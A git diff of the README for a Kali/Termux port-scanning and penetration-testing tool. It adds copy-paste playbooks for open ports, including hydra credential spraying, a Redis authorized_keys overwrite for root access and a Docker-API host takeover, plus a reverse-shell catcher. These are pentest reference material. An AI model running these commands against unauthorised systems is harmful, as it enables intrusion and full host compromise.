@@ -3,9 +3,11 @@
 [![Kali Linux Supported](https://img.shields.io/badge/Kali_Linux-Supported-blue?logo=kalilinux&logoColor=white)](https://www.kali.org)
 [![Termux Supported](https://img.shields.io/badge/Termux-Supported-green?logo=android&logoColor=white)](https://termux.dev)
 [![Bash Shell](https://img.shields.io/badge/Language-Bash_%26_Python3-orange?logo=gnubash&logoColor=white)](https://www.gnu.org/software/bash/)
+[![Termux Tutorials](https://img.shields.io/badge/Reference-termux.achik.us-purple)](https://termux.achik.us/)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
 
-> **Advanced, High-Performance Internet Port Audit & Networking Suite** specifically engineered for **Kali Linux** and **Termux (Android)** environments.
+> **Advanced, High-Performance Internet Port Audit & Guided Penetration Testing Suite** specifically engineered for **Kali Linux** and **Termux (Android)**.
+> Features an interactive step-by-step playbook assistant: **"After you see an open port, do this step-by-step."**
 
 ```
   ██████╗  ██████╗ ██████╗ ████████╗
@@ -18,123 +20,202 @@
     [ Kali Linux & Termux Edition ]
 ```
 
+Reference & Termux tutorial guide: [https://termux.achik.us/](https://termux.achik.us/)
+
 ---
 
 ## 🌟 Key Highlights
 
-- **Dual-Platform Native Design**: Runs natively on both **Kali Linux** (desktop / penetration testing distribution) and **Termux** (Android mobile terminal).
+- **🎯 Step-by-Step Action Guide & Playbooks**: Once an open port is identified, the tool immediately guides you with sequential next actions, exact copy-paste commands for both Kali and Termux, and expected indicators of success or vulnerability.
+- **Dual-Platform Native Design**: Runs identically on **Kali Linux** (desktop/pentest environment) and **Termux** (Android mobile terminal).
 - **Zero-Dependency Resilience**: Powered by an embedded high-speed multi-threaded networking engine with pure Bash `/dev/tcp` fallback. Works out-of-the-box even without third-party packages installed.
 - **Ultra-Fast Multi-threaded Scanner**: Scans up to 1,000 ports in fractions of a second with configurable concurrency (1-500 threads) and timeouts.
 - **Deep Service & Banner Fingerprinting**: Handshakes with target services to extract exact version strings, HTTP server headers, HTML page titles, SSL/TLS certificates (Common Name, Issuer, Expiry), SSH versions, and database signatures (MySQL, Redis, etc.).
-- **Local Port Inspector & Killer**: Lists all active listening TCP/UDP sockets with Process IDs (PIDs) and process names; includes a one-click/CLI process termination tool (`port -k <port>`) to free up occupied ports.
+- **Local Port Inspector & Killer**: Lists all active listening TCP/UDP sockets with Process IDs (PIDs) and process names; includes a process termination tool (`port -k <port> --force`) to free up occupied ports.
 - **Port Listener & Reverse Shell Catcher**: Emulates Netcat (`nc -lvnp`) for catching reverse shells, receiving exfiltrated files, or testing raw TCP/UDP streams.
 - **Intrusion Honeypot & Payload Logger**: Simulates vulnerable services (SSH, FTP, HTTP, SMTP, Telnet) and logs all inbound probe attempts, client IPs, timestamps, and hex/ASCII payloads to `logs/`.
 - **TCP Port Forwarder & Proxy Relay**: Bidirectional stream redirection from a local port to a remote destination with real-time transfer counters and bandwidth stats.
 - **Outbound Firewall Egress Tester**: Probes 26 critical ports to discover which outbound connections your ISP, carrier, or corporate firewall is filtering.
 - **Curated Port & CVE Knowledge Base**: Searchable offline database of 200+ ports with service classifications, security risk ratings (Low to Critical), and known exploit vectors (MS17-010 EternalBlue, Log4j, Spring4Shell, unauthenticated Redis/Docker/Kubernetes).
-- **Modern Responsive HTML Reports**: Produces a Cyberpunk/SOC-themed dark mode dashboard report with statistics cards, risk badges, and interactive JavaScript search filtering.
+- **Modern Responsive HTML Reports**: Produces a Cyberpunk/SOC-themed dark mode dashboard report with statistics cards, risk badges, interactive JavaScript search filtering, and collapsible step-by-step playbooks!
 
 ---
 
-## 📋 Features Matrix
+## 📥 How to Download & Install
 
-| Feature | Description | Kali Linux | Termux (Android) |
-| :--- | :--- | :---: | :---: |
-| **Fast TCP Connect Scan** | Concurrent multi-threaded port scanner | ✅ Full | ✅ Full |
-| **Deep Banner Grabbing** | HTTP headers, TLS certs, SSH/FTP/DB banners | ✅ Full | ✅ Full |
-| **UDP Port Scanner** | DNS, NTP, SNMP, DHCP, TFTP, Syslog probes | ✅ Full | ✅ Full |
-| **SYN Stealth Scan** | Raw packet SYN scanning (via Nmap) | ✅ Root/Sudo | ⚠️ Requires Root (tsu) |
-| **Local Port Inspector** | List listening sockets, PIDs, processes | ✅ Full | ✅ User Sockets |
-| **Port Killer** | Force terminate process holding port | ✅ Full | ✅ User Processes |
-| **Port Listener** | Interactive two-way TCP/UDP listener | ✅ Full | ✅ Ports ≥ 1024 (or root) |
-| **Honeypot Logger** | Fake banner simulation & payload dumping | ✅ Full | ✅ Ports ≥ 1024 (or root) |
-| **Port Forwarder** | Local-to-remote TCP streaming relay | ✅ Full | ✅ Full |
-| **Egress Firewall Test** | Outbound port filtering discovery | ✅ Full | ✅ Full |
-| **Port Knowledgebase** | 200+ ports with security risk & CVE notes | ✅ Full | ✅ Full |
-| **Multi-format Export** | HTML Dashboard, JSON, CSV, TXT | ✅ Full | ✅ Full |
+*(Reference format inspired by [https://termux.achik.us/](https://termux.achik.us/))*
+
+### 📱 Termux (Android) Installation
+
+Open Termux on Android and run these commands one by one:
+
+```bash
+# 1. Update Termux packages
+pkg update && pkg upgrade -y
+
+# 2. Install required dependencies
+pkg install git python curl nmap -y
+
+# 3. Clone the Port tool repository
+git clone https://github.com/lifeemotorola/Port
+
+# 4. Move into the tool directory
+cd Port
+
+# 5. Grant execution permissions
+chmod +x *
+
+# 6. Run the tool (or run ./install.sh to create global 'port' command)
+bash port.sh
+```
 
 ---
 
-## 🚀 Installation
+### 💻 Kali Linux & Debian / Ubuntu Installation
 
-### Option 1: Quick Install (Kali Linux & Debian / Ubuntu)
-
-```bash
-# Clone the repository
-git clone https://github.com/lifeemotorola/Port.git
-cd Port
-
-# Make scripts executable
-chmod +x port.sh install.sh
-
-# Run automated installer (creates global 'port' command)
-./install.sh
-```
-
-### Option 2: Termux (Android) Installation
-
-Open Termux on Android and run:
+Open terminal on Kali Linux and run:
 
 ```bash
-# Update Termux packages
-pkg update -y && pkg install -y git python curl
+# 1. Update system packages
+sudo apt update && sudo apt upgrade -y
 
-# Clone the repository
-git clone https://github.com/lifeemotorola/Port.git
+# 2. Install required dependencies
+sudo apt install git python3 curl nmap -y
+
+# 3. Clone the repository
+git clone https://github.com/lifeemotorola/Port
+
+# 4. Move into directory and give execute permission
 cd Port
+chmod +x *
 
-# Set executable permission
-chmod +x port.sh install.sh
+# 5. Run the global installer
+sudo ./install.sh
 
-# Run installer (installs into $PREFIX/bin/port)
-./install.sh
+# 6. Start the tool from any terminal
+port
 ```
 
-> **Note for Termux users**: Binding to ports below `1024` (such as port 80 or 443) requires Android root access (`tsu`). You can run listeners, honeypots, and forwarders on ports `1024-65535` without root!
+---
+
+## 🎯 Step-by-Step Guide: What to Do After Finding Open Ports
+
+When `port` discovers open ports, or when you use `--guide`, it provides a sequential action plan with copy-paste commands ready for Kali and Termux:
+
+### 1. Port 21 (FTP) Open
+- **Step 1: Check Anonymous Login**
+  - Kali: `nmap -p 21 --script ftp-anon <target>`
+  - Termux: `curl -s ftp://anonymous:anonymous@<target>:21/ || nc -nv <target> 21`
+  - *Indicator:* Look for `230 Login successful` or root file directory listings.
+- **Step 2: Check Banner for Known Backdoors**
+  - Kali: `nc -nv <target> 21 && nmap -p 21 -sV --script ftp-vuln* <target>`
+  - *Indicator:* Look for `vsftpd 2.3.4` (smiley backdoor) or `ProFTPD 1.3.3c`.
+- **Step 3: Test Weak / Default Credentials**
+  - Kali/Termux: `hydra -L users.txt -P passwords.txt ftp://<target>:21`
+- **Step 4: Download & Inspect Files**
+  - Kali: `wget -m --no-passive ftp://anonymous:anonymous@<target>:21/`
+
+---
+
+### 2. Port 22 (SSH) Open
+- **Step 1: Grab Version & Check CVEs**
+  - Kali/Termux: `nc -nv <target> 22`
+  - *Indicator:* Check if OpenSSH 8.5p1–9.7p1 (vulnerable to `regreSSHion` CVE-2024-6387).
+- **Step 2: Enumerate Authentication Methods**
+  - Kali/Termux: `ssh -v -o PreferredAuthentications=none -p 22 user@<target>`
+  - *Indicator:* Check if `password` is allowed or public key only.
+- **Step 3: Credential Spraying / Default Accounts**
+  - Kali/Termux: `hydra -l root -P passwords.txt ssh://<target>:22 -t 4`
+- **Step 4: Audit Obsolete Ciphers**
+  - Kali: `nmap -p 22 --script ssh2-enum-algos <target>`
+
+---
+
+### 3. Port 80 / 443 (HTTP & HTTPS) Open
+- **Step 1: Technology & CMS Fingerprinting**
+  - Kali: `whatweb -a 3 http://<target>:<port> && curl -I -s http://<target>:<port>`
+  - Termux: `curl -I -s http://<target>:<port>`
+- **Step 2: Directory & Hidden Endpoint Fuzzing**
+  - Kali: `gobuster dir -u http://<target>:<port> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,json,env,bak`
+  - Termux: `nmap -p <port> --script http-enum <target>`
+- **Step 3: Sensitive File Exposure Checks**
+  - Kali/Termux: `curl -s http://<target>:<port>/robots.txt http://<target>:<port>/.git/HEAD http://<target>:<port>/.env`
+  - *Indicator:* Look for exposed database credentials in `.env` or source code in `.git/`.
+- **Step 4: Web Vulnerability Assessment**
+  - Kali: `nikto -h http://<target>:<port>`
+- **Step 5: Parameter Injection Auditing**
+  - Kali: `sqlmap -u 'http://<target>:<port>/page?id=1' --batch --banner`
+
+---
+
+### 4. Port 445 (SMB) Open
+- **Step 1: Check for Critical SMB RCEs (MS17-010 EternalBlue / SMBGhost)**
+  - Kali/Termux: `nmap -p 445 --script smb-vuln-ms17-010,smb-vuln-cve-2020-0796 <target>`
+  - *Indicator:* Reports `VULNERABLE: Remote Code Execution vulnerability in Microsoft SMBv1`.
+- **Step 2: Enumerate Anonymous Shares (Null Sessions)**
+  - Kali: `smbclient -N -L //<target> || crackmapexec smb <target> -u '' -p '' --shares`
+  - Termux: `nmap -p 445 --script smb-enum-shares <target>`
+  - *Indicator:* Read access granted to `IPC$`, `C$`, or shared backups.
+- **Step 3: Enumerate Domain Users & Password Policies**
+  - Kali: `enum4linux -a <target>`
+  - Termux: `nmap -p 445 --script smb-enum-users <target>`
+- **Step 4: Check SMB Signing (NTLM Relay Vulnerability)**
+  - Kali: `crackmapexec smb <target> | grep 'signing:False'`
+
+---
+
+### 5. Port 6379 (Redis) Open
+- **Step 1: Test Unauthenticated Access (PING Probe)**
+  - Kali: `redis-cli -h <target> -p 6379 ping`
+  - Termux: `nc -nv <target> 6379 <<< 'PING'`
+  - *Indicator:* Responds with `+PONG` (CRITICAL: Database has no password!).
+- **Step 2: Dump System Info & Cached Keys**
+  - Kali: `redis-cli -h <target> info && redis-cli -h <target> keys '*'`
+  - Termux: `echo -e 'INFO\r\n' | nc -nv <target> 6379`
+- **Step 3: Root RCE via SSH Authorized Keys Overwrite**
+  - Kali: `redis-cli -h <target> config set dir /root/.ssh/ && redis-cli -h <target> config set dbfilename authorized_keys`
+  - *Indicator:* Returns `+OK`, allowing immediate root login via SSH without credentials.
+
+---
+
+### 6. Port 2375 (Docker Daemon) Open
+- **Step 1: Check Unauthenticated Docker API**
+  - Kali/Termux: `curl -s http://<target>:2375/version`
+- **Step 2: List Containers and Images**
+  - Kali: `docker -H tcp://<target>:2375 ps -a`
+- **Step 3: Instant Root Host Takeover**
+  - Kali: `docker -H tcp://<target>:2375 run -v /:/host_root --rm -it alpine chroot /host_root`
+  - *Indicator:* Root shell spawned directly on the host operating system.
+
+*(Playbooks are also built into the tool for: 23 Telnet, 25 SMTP, 53 DNS, 1433 MSSQL, 1521 Oracle, 2049 NFS, 3306 MySQL, 3389 RDP, 5432 Postgres, 5900 VNC, 8080 Tomcat/Jenkins, 9200 Elastic, 10000 Webmin, 27017 MongoDB, and more.)*
 
 ---
 
 ## 🖥️ Usage & Command Reference
 
-You can run `port` either in **Interactive Menu Mode** or via **CLI Flags**.
-
 ### 1. Interactive Menu Mode
-
-Simply run the script with no arguments:
-
+Simply run:
 ```bash
-port
-# or
 ./port.sh
 ```
 
-This launches the interactive terminal menu:
-
 ```
-  ██████╗  ██████╗ ██████╗ ████████╗
-  ██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝
-  ██████╔╝██║   ██║██████╔╝   ██║   
-  ██╔═══╝ ██║   ██║██╔══██╗   ██║   
-  ██║     ╚██████╔╝██║  ██║   ██║   
-  ╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
-       Advance Internet Port Tool v2.1.0
-    [ Kali Linux & Termux Edition ]
-
 MAIN MENU:
 
   [1]  Fast TCP Port Scanner (Top Ports / Range / Full)
   [2]  Deep Service & Banner Detector (Fingerprint / HTTP / SSL)
-  [3]  UDP Port Scanner (DNS, NTP, SNMP, DHCP, etc.)
-  [4]  Local Port Inspector (View Active Listening Sockets & PIDs)
-  [5]  Kill Process on Port (Free up occupied port)
-  [6]  Port Listener / Reverse Shell Catcher (Netcat Mode)
-  [7]  Port Honeypot & Intrusion Monitor (Detect & Log Attacks)
-  [8]  TCP Port Forwarder / Relay Proxy (Local -> Remote)
-  [9]  Firewall Outbound Egress Checker (Find Blocked Ports)
-  [10] Network Interfaces & Public IP Lookup
-  [11] Port Knowledgebase & Vulnerability Directory (Search 200+ Ports)
-  [12] Nmap Advanced Scan Integration
-  [13] Install / Update Dependencies (Kali & Termux)
+  [3]  🎯 Step-by-Step Port Action Guide & Playbooks (What to do when port is open)
+  [4]  UDP Port Scanner (DNS, NTP, SNMP, DHCP, etc.)
+  [5]  Local Port Inspector (View Active Listening Sockets & PIDs)
+  [6]  Kill Process on Port (Free up occupied port)
+  [7]  Port Listener / Reverse Shell Catcher (Netcat Mode)
+  [8]  Port Honeypot & Intrusion Monitor (Detect & Log Attacks)
+  [9]  TCP Port Forwarder / Relay Proxy (Local -> Remote)
+  [10] Firewall Outbound Egress Checker (Find Blocked Ports)
+  [11] Network Interfaces & Public IP Lookup
+  [12] Port Knowledgebase & Vulnerability Directory (Search 200+ Ports)
+  [13] Nmap Advanced Scan Integration
+  [14] Install / Update Dependencies (Kali & Termux)
   [0]  Exit
 ```
 
@@ -146,13 +227,14 @@ MAIN MENU:
 ./port.sh -t <target> [options]
 ```
 
-#### CLI Flags:
+#### CLI Options:
 
 | Flag | Parameter | Description |
 | :--- | :--- | :--- |
 | `-t, --target` | `<host>` | Target IP or hostname (e.g. `192.168.1.1` or `scanme.nmap.org`) |
-| `-p, --ports` | `<ports>` | Ports: `top20`, `top100`, `top1000`, `all`, `wellknown`, or ranges `80,443,8000-8080` (Default: `top100`) |
+| `-p, --ports` | `<ports>` | Ports: `top20`, `top100`, `top1000`, `all`, `wellknown`, or `80,443,8000-8080` |
 | `-m, --mode` | `<mode>` | Scan mode: `fast` (default), `deep` (banner + TLS cert), `udp`, `syn`, `nmap` |
+| `-g, --guide` | `[port]` | **Display step-by-step next actions & commands for open ports** |
 | `-T, --threads`| `<num>` | Concurrency worker threads (Default: `100`, Range: `1-500`) |
 | `-W, --timeout`| `<sec>` | Socket timeout in seconds (Default: `1.5`) |
 | `-o, --output` | `<file>` | Save audit report to `.txt`, `.json`, `.csv`, or `.html` |
@@ -176,91 +258,35 @@ MAIN MENU:
 
 ## 💡 Practical Examples
 
-### 1. Rapid Network Reconnaissance
-
 ```bash
-# Scan Top 20 most critical ports on a router/target
-port -t 192.168.1.1 -p top20
+# Scan target and automatically display step-by-step next actions for all open ports
+./port.sh -t 192.168.1.1 -p 21,22,80,445 --guide
 
-# Scan Top 1000 standard ports with 200 concurrent threads
-port -t scanme.nmap.org -p top1000 -T 200
+# Show step-by-step exploitation & audit guide for port 445 (SMB)
+./port.sh -g 445 192.168.1.50
+
+# Show step-by-step guide for Redis
+./port.sh -g redis 10.0.0.5
+
+# Deep scan with banner grabbing & HTML dashboard report
+./port.sh -t example.com -p 22,80,443,8080 -m deep -o reports/audit.html
+
+# Inspect what's listening locally and free port 8080
+./port.sh -i
+./port.sh -k 8080 --force
+
+# Start Netcat reverse shell listener on port 4444
+./port.sh -l 4444
+
+# Start SSH honeypot intrusion logger on port 2222
+./port.sh --honeypot 2222 --service ssh
+
+# Forward local port 8080 to remote web service
+./port.sh -f 8080:192.168.1.50:80
+
+# Test outbound firewall egress restrictions
+./port.sh -e
 ```
-
-### 2. Deep Banner Grabbing & HTML Vulnerability Report
-
-```bash
-# Probe services, extract HTTP server headers, TLS certificates, and save to HTML
-port -t example.com -p 21,22,80,443,3306,8080 -m deep -o reports/audit.html
-```
-
-### 3. UDP Port Scanning
-
-```bash
-# Probe UDP ports for DNS, NTP, SNMP, DHCP, and TFTP
-port -t 192.168.1.1 -p 53,67,69,123,161 -m udp
-```
-
-### 4. Local Port Management (Find & Kill Occupied Ports)
-
-```bash
-# View what processes are listening locally
-port -i
-
-# Kill the process occupying port 8080
-port -k 8080 --force
-```
-
-### 5. Catch a Reverse Shell / TCP Listener
-
-```bash
-# Listen on port 4444 (Netcat replacement)
-port -l 4444
-
-# Save exfiltrated session stream to disk
-port -l 4444 -o logs/session.txt
-```
-
-### 6. Honeypot Intrusion Logging
-
-```bash
-# Deploy an SSH honeypot on port 2222 that logs attacker payloads and passwords
-port --honeypot 2222 --service ssh
-```
-
-### 7. TCP Port Forwarding / Proxying
-
-```bash
-# Expose remote web server (192.168.1.100:80) locally on 127.0.0.1:8080
-port -f 8080:192.168.1.100:80
-```
-
-### 8. Firewall Egress Testing
-
-```bash
-# Discover which outbound ports are restricted by your ISP or Wi-Fi hotspot
-port -e
-```
-
-### 9. Port Security Knowledge Base Lookup
-
-```bash
-# Find security vulnerabilities and attack vectors for SMB (port 445)
-port -q 445
-
-# Search for all database-related ports and CVE exploit notes
-port -q database
-```
-
----
-
-## 📊 Sample HTML Report Output
-
-When exporting to `.html` (`-o reports/scan.html`), Port generates a self-contained, responsive dark dashboard:
-
-- **Metric Cards**: Total Scanned, Open Ports Found, Elapsed Time, Critical/High Risk Count.
-- **Interactive Search Filter**: Type in the search box to filter results instantaneously in real time.
-- **Service & Risk Badges**: Color-coded risk indicators (`Critical`, `High`, `Medium`, `Low`, `Informational`).
-- **TLS Details**: Subject, Issuer, and Expiration parsed from peer SSL certificates.
 
 ---
 
@@ -272,10 +298,13 @@ Port/
 ├── install.sh            # Global installer for Kali Linux & Termux
 ├── core/
 │   ├── engine.py         # Multi-threaded networking & socket engine
+│   ├── guide.py          # Step-by-step guide & playbook engine
+│   ├── playbooks.json    # Curated step-by-step penetration testing playbooks
 │   ├── ports_db.json     # Knowledge base of 200+ ports with CVE & risk notes
+│   ├── build_playbooks.py# Playbook generator & maintenance script
 │   └── build_db.py       # Knowledge base generator & maintenance script
 ├── tests/
-│   └── test_port.sh      # Automated integration test suite (14 test cases)
+│   └── test_port.sh      # Automated integration test suite (16 test cases)
 ├── reports/              # Default destination for generated audit reports
 ├── logs/                 # Default destination for honeypot & listener logs
 └── README.md             # Complete documentation
@@ -285,19 +314,11 @@ Port/
 
 ## 🧪 Testing
 
-The repository includes an automated integration test suite:
+Run the automated integration test suite:
 
 ```bash
 ./tests/test_port.sh
 ```
-
-All 14 integration test cases verify:
-- CLI argument handling and version strings
-- Socket scanner engines and banner grabbing
-- HTML, JSON, and CSV report exports
-- Process termination on occupied ports
-- TCP forwarder streaming
-- Honeypot intrusion logging and payload capture
 
 ---
 
